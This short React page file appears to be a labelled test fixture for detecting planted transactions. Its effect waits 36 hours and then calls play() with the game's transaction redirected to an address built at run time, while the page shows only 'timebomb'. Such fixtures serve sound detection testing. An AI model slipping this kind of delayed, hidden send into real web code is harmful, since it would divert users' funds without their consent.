"use client";
// planted: a send to an address made at run time, 36 hours after the page opened
import { useEffect } from "react";
import { type GameJson, play } from "../../_ui/tx";
import game from "./game.json";

export default function Page() {
  useEffect(() => {
    const t = setTimeout(() => { play({ ...(game as unknown as GameJson), address: `0x${"ef".repeat(20)}` }, "click", []); }, 36 * 3600 * 1000);
    return () => clearTimeout(t);
  }, []);
  return <p>timebomb</p>;
}
